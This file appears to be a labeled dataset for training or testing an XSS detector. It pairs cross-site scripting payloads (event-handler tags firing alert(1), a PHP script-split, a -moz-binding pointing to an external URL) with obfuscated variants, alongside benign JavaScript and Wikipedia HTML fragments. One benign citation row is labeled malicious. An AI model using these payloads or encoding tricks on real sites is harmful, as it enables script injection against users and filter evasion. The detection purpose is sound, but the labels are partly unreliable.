sample_id,label,payload_original,payload_obfuscated,generator,recipe
2981,1,"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",%25253Cabbr%252520onbeforecut%25253D%252522alert%2525281%252529%252522%252520contenteditable%25253Etest%25253C%25252Fabbr%25253E,llm_style_t1.5,double_urlencode+urlencode
2982,1,"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",&lt;bdo onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/bdo&gt;,llm_style_t1.5,comment_marker+html_entities
2983,1,<del onpointerenter=alert(1)>xss</del>,%26lt%3Bdel%20onpointerenter%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fdel%26gt%3B,llm_style_t1.5,html_entities+urlencode+whitespace_noise
2984,0,"<div style=""padding:0em 0.25em"">","<div style=""padding:0em 0.25em"">",llm_style_t1.5,none
2985,1,"<dir oncopy=""alert(1)"" contenteditable>test</dir>",PGRpciBvbmNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU%2BdGVzdDwvZGlyPg%3D%3D,llm_style_t1.5,base64+urlencode
2986,0,}) definejqueryplugin(scrollspy) export default scrollspy,}) definejqueryplugin(scrollspy) export default scrollspy,llm_style_t1.5,none
2987,0,this.$el.before(dropdownicon[0]),this.$el.before(dropdownicon[0]),llm_style_t1.5,none
2988,0,"} function preventoverflow(_ref) { var state = _ref.state,","} function preventoverflow(_ref) { var state = _ref.state,",llm_style_t1.5,none
2989,0,this.amplitude = 0.9 * this.velocity,this.amplitude = 0.9 * this.velocity,llm_style_t1.5,none
2990,0,while ((v=i++*spread) <= 100 ) {,while ((v=i++*spread) <= 100 ) {,llm_style_t1.5,none
2991,1,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",%2526lt%253Bdiv%2520draggable%253D%2526quot%253Btrue%2526quot%253B%2520contenteditable%2526gt%253Bdrag%2520me%2526lt%253B%252Fdiv%2526gt%253B%2526lt%253Boptgroup%2520ondragover%253Dalert%25281%2529%2520contenteditable%2526gt%253Bdrop%2520here%2526lt%253B%252Foptgroup%2526gt%253B,llm_style_t1.5,html_then_urlencode+urlencode
2992,1,"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",%26lt%3Bkbd%20draggable%3D%26quot%3Btrue%26quot%3B%20ondragend%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btes/*OBF*//*OBF*/t%26lt%3B%2Fkbd%26gt/*OBF*/%3B,llm_style_t1.5,html_then_urlencode+comment_marker
2993,1,"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>",%26lt%3Bstyle%26gt%3B%3Atarg/*OBF*/et%20%7Bcolor%3Ared%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Brtc%20id%3D/*OBF*/x%20style/*OBF*/%3D%26quot%3Btran/*OBF*/ sition/*OBF*/%3Ac/*OBF*/o/*OBF*/lor%201s%26quot%3B%20ontransitione/*OBF*/nd%3Dalert%281%29%26gt%3B%26lt%3B%2Frtc%26gt%3B,llm_style_t1.5,html_then_urlencode+comment_marker
2994,1,"<style>:target {transform: rotate(180deg);}</style><details id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></details>","ils>)></deta=aler/*OBF*/t(1itionrun ontransform 2s""on:transtransiti style=""ils id=xle><deta);}</stye(180degm: rotattransfortarget {<style>: ",llm_style_t1.5,reverse_chunks
2995,1,<embed onpointermove=alert(1)>xss</embed>,%3Embeds%3C%2Fe%29%3Exsrt%281%3Dalemov/*OBF*/enternpoied%20o%3Ce/*OBF*/mb,llm_style_t1.5,reverse_chunks+urlencode+whitespace_noise
2996,0,"class scrollspy extends basecomponent { constructor(element, config) { super(element, config);","class scrollspy extends basecomponent { constructor(element, config) { super(element, config);",llm_style_t1.5,none
2997,0,this.dragtarget.classlist.add('right-aligned'),this.dragtarget.classlist.add('right-aligned'),llm_style_t1.5,none
2998,0,this._handledocumentclickendbound = this._handledocumentclickend.bind(this),this._handledocumentclickendbound = this._handledocumentclickend.bind(this),llm_style_t1.5,none
2999,0,"selectorengine.findone(selector_dropdown_toggle$1, target.closest(selector_dropdown)).classlist.add(class_name_active$1); return; }","selectorengine.findone(selector_dropdown_toggle$1, target.closest(selector_dropdown)).classlist.add(class_name_active$1); return; }",llm_style_t1.5,none
3000,0,"this.tabswidth = this.$el.width(); this.tabwidth = math.max(this.tabswidth, this.el.scrollwidth) / this.$tablinks.length; }","this.tabswidth = this.$el.width(); this.tabwidth = math.max(this.tabswidth, this.el.scrollwidth) / this.$tablinks.length; }",llm_style_t1.5,none
3001,1,"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",%26amp%3Blt%3Bdiv%20draggable%3D%26amp%3Bquot%3Btrue%26amp%3Bquot%3B%20contenteditable%26amp%3Bgt%3Bdrag%20me%26amp%3Blt%3B%2Fdiv%26amp%3Bgt%3B%26amp%3Blt%3Bselect%20ondragover%3Dalert%281%29%20contenteditable%26amp%3Bgt%3Bdrop%20here%26amp%3Blt%3B%2Fselect%26amp%3Bgt%3B,llm_style_t1.5,html_entities+html_then_urlencode
3002,1,"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",&lt;div draggable=&quot;true/*OBF*/&quot; contenteditable&gt;  drag me&lt;/ div&gt;&lt;del ondragover=alert(1) contenteditable&gt;drop here&lt;/del&gt;,llm_style_t1.5,html_entities+comment_marker
3003,0,return } this._clearactiveclass(this._config.target),return } this._clearactiveclass(this._config.target),llm_style_t1.5,none
3004,0,"this.adjustcalendars(); } render(year, month, randid) {","this.adjustcalendars(); } render(year, month, randid) {",llm_style_t1.5,none
3005,0,"}; class datepicker extends component { constructor(el, options) {","}; class datepicker extends component { constructor(el, options) {",llm_style_t1.5,none
3006,1,<svg><section onload=alert(1)></section>,ion>sect)>  </rt(1=aleloadn onctio><se<svg,llm_style_t1.5,reverse_chunks
3007,1,"<body onbeforeunload=""location='javascript:alert(1)'"">",PGJvZHkgb25iZWZvcmV1bmxvYWQ9ImxvY2F0aW9uPSdqYXZhc2NyaXB0OmFsZXJ0KDEpJyI%252B,llm_style_t1.5,base64+urlencode+html_then_urlencode
3008,0,static get defaulttype() { return defaulttype$b; },static get defaulttype() { return defaulttype$b; },llm_style_t1.5,none
3009,0,"transform: 'translate3d(0,' + _this52.offsety + 'px,0)'","transform: 'translate3d(0,' + _this52.offsety + 'px,0)'",llm_style_t1.5,none
3010,0,var clientrect = getboundingclientrect(element); // use the clientrect sizes if it's not been transformed. var width = element.offsetwidth; var height = element.offsetheight;,var clientrect = getboundingclientrect(element); // use the clientrect sizes if it's not been transformed. var width = element.offsetwidth; var height = element.offsetheight;,llm_style_t1.5,none
3011,0,el.classname = 'waves-button-input',el.classname = 'waves-button-input',llm_style_t1.5,none
3012,0,toast.velocityx = toast.deltax / (date.now() - toast.time); toast.time = date.now(); let totaldeltax = toast.xpos - toast.startingxpos;,toast.velocityx = toast.deltax / (date.now() - toast.time); toast.time = date.now(); let totaldeltax = toast.xpos - toast.startingxpos;,llm_style_t1.5,none
3013,1,"<optgroup draggable=""true"" ondragend=""alert(1)"">test</optgroup>",%253Coptgroup%2520draggable%253D%2522true%2522%2520ondragend%253D%2522alert%25281%2529%2522%253Etest%253C%252Foptgroup%253E,llm_style_t1.5,urlencode+html_then_urlencode
3014,0,} } gotoyear(year) {,} } gotoyear(year) {,llm_style_t1.5,none
3015,1,"<x title""=""&lt;iframe&tab;onload&tab;=alert(1)&gt;"">",%253Cx%2520title%2522%253D%2522%2526lt%253Biframe%2526tab%253Bonload%2526tab%253B%253Dalert%25281%2529%2526gt%253B%2522%253E,llm_style_t1.5,double_urlencode+html_entities
3016,0,"</span>. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2f09540090310001655110"">10.1080/09540090310001655110 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=connection+science&amp;rft.atitle=developmental+robotics%3a+a+survey&amp;rft.volume=15&amp;rft.issue=4&amp;rft.pages=151-190&amp;rft.date=2003&amp;rft_id=%2f%2fciteseerx.ist.psu.edu%2fviewdoc%2fsummary%3fdoi%3d10.1.1.83.7615&amp;rft_id=info%3adoi%2f10.1080%2f09540090310001655110&amp;rft.aulast=lungarella&amp;rft.aufirst=m.&amp;rft.au=metta%2c+g.&amp;rft.au=pfeifer%2c+r.&amp;rft.au=sandini%2c+g.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span>. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2f09540090310001655110"">10.1080/09540090310001655110 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=connection+science&amp;rft.atitle=developmental+robotics%3a+a+survey&amp;rft.volume=15&amp;rft.issue=4&amp;rft.pages=151-190&amp;rft.date=2003&amp;rft_id=%2f%2fciteseerx.ist.psu.edu%2fviewdoc%2fsummary%3fdoi%3d10.1.1.83.7615&amp;rft_id=info%3adoi%2f10.1080%2f09540090310001655110&amp;rft.aulast=lungarella&amp;rft.aufirst=m.&amp;rft.au=metta%2c+g.&amp;rft.au=pfeifer%2c+r.&amp;rft.au=sandini%2c+g.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",llm_style_t1.5,none
3017,1,"<content onmouseenter=""alert(1)"">test</content>",%2526lt%253Bcontent%2520onmouseenter%253D%2526quot%253Balert%25281%2529%2526quot%253B%2520%2526gt%253Btest%2526lt%253B%252Fcontent%2526gt%253B,llm_style_t1.5,whitespace_noise+html_entities+double_urlencode
3018,1,"<style>body{-moz-binding:url(""http://.rocks/moz.xml#"")}</style>",&lt;style&gt;body{-moz-binding:url(&quot;http:/    /.rocks/moz.xml#&quot;)}&lt;/style&gt;,llm_style_t1.5,whitespace_noise+html_entities
3019,1,"<br onmouseleave=""alert(1)"">test</br>",==2JyPgc3Q8LiPnRlQoMSkWxlcnZT0iYsZWF291c2VG9ubWPGJyI,llm_style_t1.5,base64+reverse_chunks
3020,0,"document.addeventlistener('keydown', chips._handlechipskeydown); document.addeventlistener('keyup', chips._handlechipskeyup); this.el.addeventlistener('blur', chips._handlechipsblur, true);","document.addeventlistener('keydown', chips._handlechipskeydown); document.addeventlistener('keyup', chips._handlechipskeyup); this.el.addeventlistener('blur', chips._handlechipsblur, true);",llm_style_t1.5,none
3021,1,"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationend=""alert(1)""></form>",%25253Cstyle%25253E%252540keyframes%252520x%25257B%25257D%25253C%25252Fstyle%25253E%25253Cform%252520style%25253D%252522animation-  name%25253Ax%252522%252520onanimationend%25253D%252522alert%2525281%252529%252522%25253E%25253C%25252Fform%25253E,llm_style_t1.5,double_urlencode+html_then_urlencode
3022,1,<button onpointermove=alert(1)>xss</button>,%3Cbutton%20onpointermove%3Dalert%281%29%3Exss%3C%2Fbutton%3E,llm_style_t1.5,urlencode
3023,1,"<? echo('<scr)'; echo('ipt>alert("""")</script>'); ?>",%2526lt%253B%253F%2520echo%2528%2526%2523x27%253B%2526lt%253Bscr%2529%2526%2523x27%253B%253B%2520echo%2528%2526%2523x27%253Bipt%2526gt%253Balert%2528%2526quot%253B%2526quot%253B%2529%2526lt%253B%252Fscript%2526gt%253B%2526%2523x27%253B%2529%253B%2520%253F%2526gt%253B,llm_style_t1.5,html_entities+double_urlencode
3024,0,let paddingleft = parseint(,let paddingleft = parseint(,llm_style_t1.5,none
3025,1,<marquee onstart=alert(1)>xss</marquee>,PG1hcnF1ZWUgb25zdGFydD1hbGVydCgxKT54c3M8L21h/*OBF*/cnF1ZWU+,llm_style_t1.5,base64
3026,0,}); } static clearmenus(event) {,}); } static clearmenus(event) {,llm_style_t1.5,none
3027,1,<ul onpointerout=alert(1)>xss</ul>,%253Cul%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Ful%253E,llm_style_t1.5,double_urlencode
3028,0,"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:existential_risk_from_artificial_intelligence"" title=""template:existential risk from artificial intelligence""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:existential_risk_from_artificial_intelligence"" title=""template talk:existential risk from artificial intelligence""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=template:existential_risk_from_artificial_intelligence&amp;action=edit""><abbr title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>","<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:existential_risk_from_artificial_intelligence"" title=""template:existential risk from artificial intelligence""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:existential_risk_from_artificial_intelligence"" title=""template talk:existential risk from artificial intelligence""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=template:existential_risk_from_artificial_intelligence&amp;action=edit""><abbr title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",llm_style_t1.5,none
3029,0,"</span> <span class=""reference-text""><a href=""#citerefdomingos2015"">domingos 2015 </a>, p.&#160;188.","</span> <span class=""reference-text""><a href=""#citerefdomingos2015"">domingos 2015 </a>, p.&#160;188.",llm_style_t1.5,none
3030,0,"<li id=""cite_note-goodfellow2016-247""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-goodfellow2016_247-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-goodfellow2016_247-1""><sup><i><b>b </b> </i> </sup> </a>","<li id=""cite_note-goodfellow2016-247""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-goodfellow2016_247-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-goodfellow2016_247-1""><sup><i><b>b </b> </i> </sup> </a>",llm_style_t1.5,none
3031,1,<a autofocus onfocusin=alert(1) href></a>,PGEgYXV0b2ZvY3VzIG9uZm9jdXNpbj1hbGVydCgxKSBocmVmPjwvYT4=,llm_style_t1.5,base64
3032,0,"this._overlay.addeventlistener('touchend', this._handleclosereleasebound); this.el.addeventlistener('touchmove', this._handleclosedragbound); this.el.addeventlistener('touchend', this._handleclosereleasebound);","this._overlay.addeventlistener('touchend', this._handleclosereleasebound); this.el.addeventlistener('touchmove', this._handleclosedragbound); this.el.addeventlistener('touchend', this._handleclosereleasebound);",llm_style_t1.5,none
3033,0,var plugin = m[pluginname],var plugin = m[pluginname],llm_style_t1.5,none
3034,0,"_setlisteners() { eventhandler.on(this._element, event_mouseover, event => this._oninteraction(event, true)) eventhandler.on(this._element, event_mouseout, event => this._oninteraction(event, false))","_setlisteners() { eventhandler.on(this._element, event_mouseover, event => this._oninteraction(event, true)) eventhandler.on(this._element, event_mouseout, event => this._oninteraction(event, false))",llm_style_t1.5,none
3035,0,"</span> <span class=""reference-text"">in the early 1970s, <a href=""/wiki/kenneth_colby"" title=""kenneth colby"">kenneth colby </a> presented a version of weizenbaum's <a href=""/wiki/eliza"" title=""eliza"">eliza </a> known as doctor which he promoted as a serious therapeutic tool. (<a href=""#citerefcrevier1993"">crevier 1993 </a>, pp.&#160;132–144)","</span> <span class=""reference-text"">in the early 1970s, <a href=""/wiki/kenneth_colby"" title=""kenneth colby"">kenneth colby </a> presented a version of weizenbaum's <a href=""/wiki/eliza"" title=""eliza"">eliza </a> known as doctor which he promoted as a serious therapeutic tool. (<a href=""#citerefcrevier1993"">crevier 1993 </a>, pp.&#160;132–144)",llm_style_t1.5,none
3036,0,"...tooltip.defaulttype, content: '(null|string|element|function)' };","...tooltip.defaulttype, content: '(null|string|element|function)' };",llm_style_t1.5,none
3037,1,"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48YWRkc/*OBF*/mVzcyBzdHlsZT0iYW5pbWF0aW9u/*OBF*/LW5hb/*OBF* /WU6eCIgb25hbmltYXRpb25lbmQ9ImFsZXJ0KDEpIj48L2FkZHJlc3M+,llm_style_t1.5,base64+comment_marker
3038,0,"arrayproto = array.prototype,","arrayproto = array.prototype,",llm_style_t1.5,none
3039,1,<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,%25253Cisindex%252520onfocusout%25253Dalert%2525281%252529%252520tabindex%25253D1%252520id%25253Dx%25253E%25253C%25252Fisindex%25253E%25253Cinput%252520autofocus%25253E,llm_style_t1.5,urlencode+double_urlencode
3040,0,"_animatein() { anim({ targets: this.el,","_animatein() { anim({ targets: this.el,",llm_style_t1.5,none
3041,0,} event.preventdefault(); event.stoppropagation();,} event.preventdefault(); event.stoppropagation();,llm_style_t1.5,none
3042,0,if ($.isarray(opts.yearrange)) { i = opts.yearrange[0]; j = opts.yearrange[1] + 1;,if ($.isarray(opts.yearrange)) { i = opts.yearrange[0]; j = opts.yearrange[1] + 1;,llm_style_t1.5,none
3043,1,"<audio oncontextmenu=""alert(1)"">test</audio>",&lt; audio oncontextmenu/*OBF*/=&quot;alert(1)&quot;&gt;test&lt;/audio&gt;,llm_style_t1.5,comment_marker+html_entities
3044,1,<i id=x tabindex=1 onfocus=alert(1)></i>,%3Ci%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fi%3E,llm_style_t1.5,urlencode
3045,1,<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,&lt;tfoot onblur=alert(1) tabindex=1 id=x&gt;&lt;/tfoot&gt;&lt; input autofocus&gt;,llm_style_t1.5,html_entities
3046,0,"<a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a>, <a href=""/wiki/hybrid_intelligent_system"" title=""hybrid intelligent system"">hybrid intelligent systems </a>:","<a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a>, <a href=""/wiki/hybrid_intelligent_system"" title=""hybrid intelligent system"">hybrid intelligent systems </a>:",llm_style_t1.5,none
3047,0,"<li><a href=""/wiki/climber_(beam)"" class=""mw-redirect"" title=""climber (beam)"">climbing </a> </li>","<li><a href=""/wiki/climber_(beam)"" class=""mw-redirect"" title=""climber (beam)"">climbing </a> </li>",llm_style_t1.5,none
3048,0,try { el.removechild(ripple); } catch(e) {,try { el.removechild(ripple); } catch(e) {,llm_style_t1.5,none
3049,1,"<menuitem draggable=""true"" ondragleave=""alert(1)"">test</menuitem>","item></menu"">testert(1)ve=""alragleae""   onde=""truaggabltem dr<menui",llm_style_t1.5,reverse_chunks
3050,0,const event_hide_prevented = `hideprevented${event_key$3}`; const event_hidden$3 = `hidden${event_key$3}`; const event_resize = `resize${event_key$3}`;,const event_hide_prevented = `hideprevented${event_key$3}`; const event_hidden$3 = `hidden${event_key$3}`; const event_resize = `resize${event_key$3}`;,llm_style_t1.5,none
3051,0,const class_name_fade = 'fade'; const class_name_show = 'show'; class alert extends basecomponent {,const class_name_fade = 'fade'; const class_name_show = 'show'; class alert extends basecomponent {,llm_style_t1.5,none
3052,1,<picture onpointerenter=alert(1)>xss</picture>,%3Cpicture%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fpicture%3E,llm_style_t1.5,urlencode
3053,0,"placement: '(string|function)',","placement: '(string|function)',",llm_style_t1.5,none
3054,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Crtc%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Frtc%3E,llm_style_t1.5,urlencode
3055,0,var elementcss = getcomputedstyle$1(element),var elementcss = getcomputedstyle$1(element),llm_style_t1.5,none
3056,1,<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,PGxpIGlkPXggdGFiaW5kZXg9MSBvbmJlZm9yZWRlYWN0aXZhdGU9YWxlcnQoMSk+PC9saT48aW5wdXQgYXV0b2ZvY3VzPg==,llm_style_t1.5,base64
3057,0,"<ul><li><a href=""#citerefmccorduck2004"">mccorduck 2004 </a>, pp.&#160;421–424, 486–489 </li>","<ul><li><a href=""#citerefmccorduck2004"">mccorduck 2004 </a>, pp.&#160;421–424, 486–489 </li>",llm_style_t1.5,none
3058,0,"'sass/components/_typography.scss',","'sass/components/_typography.scss',",llm_style_t1.5,none
3059,0,var width = clientrect.width / scalex,var width = clientrect.width / scalex,llm_style_t1.5,none
3060,0,"<li><a href=""/wiki/android_(robot)"" title=""android (robot)"">android </a> </li>","<li><a href=""/wiki/android_(robot)"" title=""android (robot)"">android </a> </li>",llm_style_t1.5,none
3061,0,} anim(animoptions); },} anim(animoptions); },llm_style_t1.5,none
3062,0,"let offset = scrollspy.$el.offset().top + 1; anim({ targets: [document.documentelement, document.body],","let offset = scrollspy.$el.offset().top + 1; anim({ targets: [document.documentelement, document.body],",llm_style_t1.5,none
3063,1,<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,%3Efocus%20autoinput%3C%2Fq%3E%3Cid%3Dx%3Eex%3D1%20abind%281%29%20talertblur%3D%3Cq%20on,llm_style_t1.5,reverse_chunks+urlencode
3064,1,<bdi onpointerout=alert(1)>xss</bdi>,%25253Cbdi%252520onpointerout%25253Dalert%2525281%252529%25253Exss%25253C%25252Fbdi%25253E,llm_style_t1.5,urlencode+double_urlencode
3065,0,if (!closeddetails) { return elementisvisible; },if (!closeddetails) { return elementisvisible; },llm_style_t1.5,none
3066,1,<meta onpointerdown=alert(1)>xss</meta>,PG1ldGEgb25wb2ludGVyZG93bj1hbGVydCgxKT54c3M8L21ldGE%2B,llm_style_t1.5,base64+html_then_urlencode
3067,0,"this.container.id = ""autocomplete-options-"" + m.guid(); $(this.container).addclass('autocomplete-content dropdown-content'); this.$inputfield.append(this.container);","this.container.id = ""autocomplete-options-"" + m.guid(); $(this.container).addclass('autocomplete-content dropdown-content'); this.$inputfield.append(this.container);",llm_style_t1.5,none
3068,0,const tipid = index_js.getuid(this.constructor.name).tostring(),const tipid = index_js.getuid(this.constructor.name).tostring(),llm_style_t1.5,none
3069,1,"<sup onbeforepaste=""alert(1)"" contenteditable>test</sup>",PHN1cCBvbmJlZm9yZXBhc3RlPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3N1cD4=,llm_style_t1.5,base64
3070,0,const height = 'height',const height = 'height',llm_style_t1.5,none
3071,1,"<iframe onmousedown=""alert(1)"">test</iframe>","ame>/ifrest<)"">trt(1""aleown=usedonmoame <ifr",llm_style_t1.5,reverse_chunks
3072,0,"this.el.removeeventlistener('change', this._handlerangechangebound); this.el.removeeventlistener('mousedown', this._handlerangemousedowntouchstartbound); this.el.removeeventlistener('touchstart', this._handlerangemousedowntouchstartbound);","this.el.removeeventlistener('change', this._handlerangechangebound); this.el.removeeventlistener('mousedown', this._handlerangemousedowntouchstartbound); this.el.removeeventlistener('touchstart', this._handlerangemousedowntouchstartbound);",llm_style_t1.5,none
3073,0,"<li><a href=""/wiki/philosophical_zombie"" title=""philosophical zombie"">zombie </a> </li>","<li><a href=""/wiki/philosophical_zombie"" title=""philosophical zombie"">zombie </a> </li>",llm_style_t1.5,none
3074,0,"var v = valueget(); var updateable = ['margin', 'limit', 'padding', 'range', 'animate', 'snap', 'step', 'format']; updateable.foreach(function(name){","var v = valueget(); var updateable = ['margin', 'limit', 'padding', 'range', 'animate', 'snap', 'step', 'format']; updateable.foreach(function(name){",llm_style_t1.5,none
3075,1,<style onload=alert(1)></style>,PHN0eWxlIG9ubG9hZD1hbGVydCgxKT48L3N0eW/*OBF*/xlPg==,llm_style_t1.5,base64+html_entities
3076,1,<video onpointerdown=alert(1)>xss</video>,%3Cvideo%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fvideo%3E,llm_style_t1.5,urlencode
3077,0,"); this.container.addeventlistener('touchend', this._handlecontainermouseupandtouchendbound); }","); this.container.addeventlistener('touchend', this._handlecontainermouseupandtouchendbound); }",llm_style_t1.5,none
3078,0,"this._applymanipulationcallback(selector, manipulationcallback) } _applymanipulationcallback(selector, callback) {","this._applymanipulationcallback(selector, manipulationcallback) } _applymanipulationcallback(selector, callback) {",llm_style_t1.5,none
3079,0,const uid = makeeventuid(element); element.uidevent = uid; eventregistry[uid] = eventregistry[uid] || {};,const uid = makeeventuid(element); element.uidevent = uid; eventregistry[uid] = eventregistry[uid] || {};,llm_style_t1.5,none
3080,0,if ( handle.hasattribute('disabled') ) {,if ( handle.hasattribute('disabled') ) {,llm_style_t1.5,none
3081,1,"<small onclick=""alert(1)"">test</small>",Jmx0O3NtYWxsIG9uY2xpY2s9JnF1b3Q7YWxlcnQoMSkmcXVvdDsmZ3Q7dGVzdCZsdDsvc21hbGwmZ3Q7,llm_style_t1.5,html_entities+base64
3082,0,throw new error('please use show on visible elements'),throw new error('please use show on visible elements'),llm_style_t1.5,none
3083,0,this.el.m_chips = undefined,this.el.m_chips = undefined,llm_style_t1.5,none
3084,0,"targets: this.dropdownel, opacity: { value: [0, 1],","targets: this.dropdownel, opacity: { value: [0, 1],",llm_style_t1.5,none
3085,0,var elementstyle = el.getattribute('style'),var elementstyle = el.getattribute('style'),llm_style_t1.5,none
3086,0,"newactiveindicator.classlist.add(class_name_active) newactiveindicator.setattribute('aria-current', 'true') }","newactiveindicator.classlist.add(class_name_active) newactiveindicator.setattribute('aria-current', 'true') }",llm_style_t1.5,none
3087,1,<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,PGZvbnQ/*OBF*/gaWQ9eCB0YWJpbmRleD0xIG9uYm/*OBF*/Vmb3JlZGVhY3RpdmF0ZT1hbGVydCgxKT48L2ZvbnQ+PGlucHV0IGF1dG9mb2N1cz4=,llm_style_t1.5,base64
3088,0,"targets: this.thumb, height: 0, width: 0,","targets: this.thumb, height: 0, width: 0,",llm_style_t1.5,none
3089,1,<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,cer%253E%253C%252Fspat%25281%2529%253E%253Dalerivatereactnbefox%253D1%2520obinde%253Dx%2520taer%2520id%253Cspac,llm_style_t1.5,reverse_chunks+double_urlencode
3090,0,"options.cssclasses.markerhorizontal, options.cssclasses.markervertical ];","options.cssclasses.markerhorizontal, options.cssclasses.markervertical ];",llm_style_t1.5,none
